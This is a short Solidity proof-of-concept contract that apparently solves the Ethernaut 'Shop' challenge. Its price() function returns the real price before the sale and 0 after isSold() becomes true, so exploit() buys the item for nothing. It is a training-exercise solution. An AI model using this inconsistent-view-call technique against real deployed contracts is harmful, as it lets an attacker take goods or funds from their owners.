// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "Ethernaut/shop.sol";

contract ShopPoc is Buyer 
{
  Shop shop;

  constructor(address _shop)
  {
    shop = Shop(_shop);
  }
  function price() external view returns (uint) 
  {
      if (shop.isSold()) {
        return 0;
      } else {
        return shop.price();
      }
  }

  function exploit() public
  {
    shop.buy();
  }
} 